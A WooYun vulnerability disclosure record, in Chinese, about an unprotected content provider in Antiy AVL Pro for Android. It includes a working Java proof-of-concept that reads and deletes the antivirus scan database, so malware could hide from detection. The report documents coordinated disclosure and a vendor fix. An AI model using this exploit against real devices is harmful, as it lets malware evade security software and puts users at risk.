{"id": 2984, "wybug_id": "wooyun-2014-056668", "wybug_title": "Antiy(安天)漏洞可导致病毒免杀或误杀合法软件(控制杀软行为)", "wybug_corp": "安天实验室", "wybug_author": "大和尚", "wybug_date": "2014-04-12 14:47", "wybug_open_date": "2014-07-11 14:47", "wybug_type": "非授权访问/认证绕过", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["客户端程序设计错误", "手机应用", "安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-04-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-04-15：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-06-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-06-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-11：\t细节向公众公开  简要描述： Antiy avl pro android版存在漏洞,若被病毒/木马利用可以逃过avl的扫描发现 详细说明：  avl pro在杀毒引擎查杀完手机之后,杀毒结果先保存在db中,之后通过provider读出扫描信息呈现给用户, 如有病毒则提示删除/清除等动作. 而该provider名为content://com.antiy.avlpro.MyProvider,却无权限暴露在外.导致任意apk,无须申请任何特殊权限即可随意访问,读取/删除/插入db中的内容.从而,若是恶意程序利用,则可以构造内容插入,以导致avl误判/删除正常合法apk;抑或实时(或短时间隔线程轮寻)db内容若见到自己package则予以删除,从而免杀.   漏洞证明：  poc: \npackage com.ieroot.android_providerdemo;import android.net.Uri;import android.os.Bundle;import android.app.Activity;import android.content.ContentResolver;import android.database.Cursor;import android.view.Menu;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.TextView;import android.widget.Toast;public class MainActivity extends Activity implements OnClickListener{\t\t@Override\tprotected void onCreate(Bundle savedInstanceState) {\t\tsuper.onCreate(savedInstanceState);\t\tsetContentView(R.layout.activity_main);\t\tTextView tView = (TextView)findViewById(R.id.result);\t\ttView.setText(getData());\t\t\t\t// add onclick listener\t\tButton show = (Button)findViewById(R.id.show);\t\tshow.setOnClickListener(this);\t\tButton delete = (Button)findViewById(R.id.delete);\t\tdelete.setOnClickListener(this);\t}\t@Override\tpublic boolean onCreateOptionsMenu(Menu menu) {\t\t// Inflate the menu; this adds items to the action bar if it is present.\t\tgetMenuInflater().inflate(R.menu.main, menu);\t\treturn true;\t}\t\tpublic String  getData() \t{\t\tString avlUri = \"content://com.antiy.avlpro.MyProvider\";\t\tString resultString = \"\";\t\tContentResolver resolver = this.getContentResolver();\t\tCursor cursor = resolver.query(Uri.parse(avlUri), new String[]{\"pkg_name\",\"v_name\"}, null, null, null);\t\twhile (cursor.moveToNext()) \t\t{\t\t\tString pkg_name = cursor.getString(cursor.getColumnIndex(\"pkg_name\"));\t\t\tString v_name = cursor.getString(cursor.getColumnIndex(\"v_name\"));\t\t\tresultString += pkg_name + \"\\t\" + v_name;\t\t}\t\treturn resultString;\t}\tpublic void deleteData() \t{\t\tString avlUri = \"content://com.antiy.avlpro.MyProvider\";\t\tContentResolver resolver = this.getContentResolver();\t\tresolver.delete(Uri.parse(avlUri), \"pkg_name = 'com.tf.thinkdroid.sg'\", null);\t\tToast.makeText(this, \"delete is clicked\", 0);\t}\t@Override\tpublic void onClick(View arg0) {\t\t// TODO Auto-generated method stub\t\tif (arg0.getId() == R.id.show) \t\t{\t\t\tTextView tView = (TextView)findViewById(R.id.result);\t\t\ttView.setText(\"show : \" + \"\\n\" + getData());\t\t\t\t\t}\t\tif (arg0.getId() == R.id.delete)\t\t{\t\t\tdeleteData();\t\t}\t}}\n为证明清晰, 特意把各个步骤拆分,逐一截图讲解. 实际使用时,用户看不到任何这些过程. 只能承受结果: 病毒没有被发现或者合法程序被查杀. 截图: 该图中avl查杀一个risk. 务必记住名字.图1,\n\n该图中,POC程序通过暴露的provider读出db中的内容.图2,\n\n点击删除button, 删除db中的内容.该图中,显示db中的内容已空.图3, \n\n回到avlpro的界面,显示0个威胁:图4,\n\n也就是说,POC程序在没有申请任何权限的情况下,成功修改了avl pro的判别结果.发散思维~~   修复方案：  你懂得   版权声明：转载请注明来源 大和尚@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-04-12 15:18 厂商回复： 多谢，我们已经修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-04-12 00:11 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  那么给力？    \n     2014-04-12 19:16 |    \t\thacker@sina.cn \t\t\t( 普通白帽子  |\t\t\t        Rank:288 漏洞数:27        | ANONYMOUS)\t\t \n  看着好牛逼    \n     2014-04-16 11:24 |    \t\t大和尚 \t\t\t( 实习白帽子  |\t\t\t        Rank:49 漏洞数:5        | www.ieroot.com 积极向上的心态！百折不挠...)\t\t \n  多谢Antiy实验室的扑克牌~~ 玩什么好呢.. ... 真捉急啊..    \n     2014-07-11 16:19 |    \t\tDot \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:3        | 我就佩服Ph牛！)\t\t \n  用了这么久的安卓至今没遇到过病毒- -    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}